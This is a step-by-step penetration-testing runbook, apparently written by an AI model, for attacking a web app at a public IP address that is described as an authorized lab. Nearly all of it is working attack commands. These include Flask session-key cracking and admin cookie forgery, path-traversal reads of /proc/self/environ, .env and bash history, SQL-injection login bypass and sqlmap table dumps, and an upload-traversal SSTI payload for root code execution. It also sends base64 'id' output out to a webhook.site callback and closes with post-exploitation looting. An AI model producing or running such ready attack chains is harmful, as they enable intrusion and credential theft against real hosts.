# RUNBOOK — Atelier (18.217.39.191), run from Kali (42.60.142.138)

Copy-paste top to bottom. Each step says what to look for and where to go next.
Authorized SIT lab. No DoS, don't destroy data, document-and-stop on AWS creds.

---

## STEP 0 — set up once

```bash
cd ~/Desktop
export T=http://18.217.39.191
# open https://webhook.site in a browser, copy your token, paste it here:
export WH=webhook.site/PASTE-YOUR-TOKEN
# prove the callback works (should appear in the browser tab):
curl -s "https://$WH/selftest-$(id|base64 -w0)"
```
✓ selftest shows in the browser → callbacks work. If not, re-copy the token.

---

## STEP 1 — foothold (register + log in)

```bash
rm -f jar.txt
curl -skb jar.txt -c jar.txt -L "$T/register" \
  -d 'full_name=Avery Morgan' -d 'username=pentest1' \
  -d 'email=pentest1@test.invalid' -d 'password=Passw0rd!'
curl -skb jar.txt -c jar.txt -L "$T/login" \
  -d 'username=pentest1' -d 'password=Passw0rd!'
curl -skb jar.txt -o /dev/null -w "support=%{http_code}\n" "$T/support"
```
✓ `support=200` → you're in. `302` → login failed, re-check fields.

---

## STEP 2 — recon pre-pass (decides which chain is live)

```bash
# a) exact versions
curl -skI "$T/" | grep -i server
curl -sk  "$T/health"

# b) leaked source / VCS / backups  ("forgot to clear the docker")
for p in .git/config .git/HEAD .env app.py main.py wsgi.py config.py settings.py \
         requirements.txt app.py.bak "app.py~" .DS_Store docker-compose.yml \
         Dockerfile backup.zip server.py; do
  printf "%-20s " "$p"
  curl -sk -o /dev/null -w "%{http_code} %{size_download}B\n" "$T/$p"
done

# c) what 443 serves + cert names
curl -skI "https://18.217.39.191/" | head -5
echo | openssl s_client -connect 18.217.39.191:443 2>/dev/null \
  | openssl x509 -noout -text 2>/dev/null | grep -A1 'Alternative Name'

# d) hidden routes
ffuf -u "$T/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,401,403 -c
```
✓ Any `200` with real size on `.git/config`, `.env`, or `app.py*` → jump to STEP 6 (free source).
✓ Note the exact Werkzeug/Python versions for STEP 8.

---

## STEP 3 — decode your session cookie

```bash
SESS=$(grep -i session jar.txt | awk '{print $NF}'); echo "$SESS"
python3 - "$SESS" <<'PY'
import sys,base64,zlib,json
c=sys.argv[1].split('.')[0]; c+='='*(-len(c)%4)
d=base64.urlsafe_b64decode(c)
if d[:1]==b'.': d=zlib.decompress(d[1:])
print(d)
PY
```
✓ You now see what the session stores (`user_id`, maybe `is_admin`/`role`). That's what you'll flip in STEP 4.

---

## STEP 4 — crack SECRET_KEY, forge admin  (Chain 1, fastest win)

```bash
pip install flask-unsign 2>/dev/null
SESS=$(grep -i session jar.txt | awk '{print $NF}')
# try common keys, then rockyou:
flask-unsign --unsign --cookie "$SESS"
flask-unsign --unsign --cookie "$SESS" --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
```
✓ Prints `[+] Found secret key: '....'` → forge (edit fields to match STEP 3):
```bash
KEY='PASTE-CRACKED-KEY'
FORGED=$(flask-unsign --sign --secret "$KEY" \
  --cookie "{'user_id': 1, 'username': 'admin', 'is_admin': True, 'account_type': 'staff'}")
curl -sk -b "session=$FORGED" "$T/account" | grep -i 'account type'
curl -sk -b "session=$FORGED" -o /dev/null -w "admin_page=%{http_code}\n" "$T/admin"
```
✓ Account type flips to staff/admin → explore admin-only pages for a file/report feature (your exec sink).

---

## STEP 5 — path-traversal file read  (Chain 2, wins everything)

```bash
# find a file-serving param on the photo endpoint or static:
for u in \
 "/api/tickets/1/photo?file=../../../../etc/passwd" \
 "/api/tickets/1/photo?name=../../app/app.py" \
 "/static/../app/app.py" \
 "/static/..%2f..%2fapp%2fapp.py" \
 "/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd"; do
  echo "== $u =="; curl -skb jar.txt "$T$u" | head -3; echo
done
```
✓ One returns file contents → read the crown jewels:
```bash
V='/the/vuln/endpoint?file='   # set to whatever worked above
for f in /app/app.py /app/tools.py /app/agent.py /app/config.py \
         /app/.env /proc/self/environ /etc/passwd /root/.bash_history; do
  echo "===== $f ====="; curl -skb jar.txt "$T$V$f"; echo
done
```
`/proc/self/environ` leaks `SECRET_KEY` → feed STEP 4. `/app/*.py` reveals the real sink + the flag.

---

## STEP 6 — rip leaked source  (Chain 6)

```bash
# only if STEP 2b showed .git/config = 200:
pip install git-dumper 2>/dev/null
git-dumper "$T/.git/" ./atelier-src
grep -riE 'secret_key|password|api[_-]?key|flag|token|popen|system|render_template_string' ./atelier-src
# or if .env leaked directly:
curl -sk "$T/.env"
```
✓ Source in hand → read it, find the sink, pull the flag. A leaked `SECRET_KEY` → STEP 4 instantly.

---

## STEP 7 — SQLi in the web forms  (Chain 3)

```bash
# login bypass probes:
for u in "admin' -- -" "' OR '1'='1' -- -" "admin' OR 1=1 -- -"; do
  echo "== $u =="
  curl -sk -c /tmp/sqli.jar -L "$T/login" \
    --data-urlencode "username=$u" --data-urlencode "password=x" \
    -o /dev/null -w "%{http_code} -> %{redirect_url}\n"
done
# error/boolean on an id param:
curl -skb jar.txt "$T/products?id=1'" | grep -iE 'error|sqlite|syntax' | head
# hand the real param to sqlmap:
sqlmap -u "$T/products?id=1" --cookie="session=$(grep -i session jar.txt|awk '{print $NF}')" \
  --batch --level 3 --risk 2 --dbms sqlite --dump -T users
```
✓ Dumps the users table → crack hashes / reuse creds against STEP 4 or SSH.

---

## STEP 8 — upload traversal → template SSTI → root  (Chain 5)

```bash
# make a valid image, send it with a filename that escapes into templates/:
python3 tools/make_payload_image.py --payload "marker" -o /tmp/x.jpg
curl -skb jar.txt -F 'file=@/tmp/x.jpg;filename=../../app/templates/pwn.html' \
  "$T/api/tickets/1/photo"
curl -skb jar.txt "$T/pwn"            # did the file land + render?
```
✓ If `/pwn` renders → write a real RCE template:
```bash
printf '%s' '{{ cycler.__init__.__globals__.os.popen("id").read() }}' > /tmp/pwn.html
curl -skb jar.txt -F 'file=@/tmp/pwn.html;filename=../../app/templates/pwn.html' "$T/api/tickets/1/photo"
curl -skb jar.txt "$T/pwn"            # expect uid=0  <-- ROOT
```

---

## STEP 9 — LLM sweep (run in parallel, it's slow)

```bash
python3 tools/phase_a_sweep.py --oob-host "$WH" --phase all
# watch webhook.site for a callback carrying base64 'id' output = blind RCE
```

---

## STEP 10 — after ANY exec (STEP 4/5/8/9), confirm + loot

```
id ; whoami ; uname -a            # uid=0 == root proof for the report
cat /proc/1/cgroup                # confirm container + image name
cat /app/*.py                     # the sink, in plain source
cat /app/.env /root/.bash_history
find / -name '*.db' -o -name '*.sqlite*' 2>/dev/null | head
grep -rniE 'flag|FLAG\{' /app /root /home 2>/dev/null | head
```
Read source before dropping a shell — uploaded files get deleted, source doesn't.

---

## Decision summary

- STEP 2 shows `.git`/`.env` → STEP 6 (easiest).
- STEP 4 cracks the key → admin, done.
- STEP 5 reads a file → read source + SECRET_KEY, win twice.
- STEP 8 writes a template → direct root.
- STEP 9 callback fires → blind root via the LLM.
Any one is enough. Paste the output of whichever fires and I'll finish the exploit.
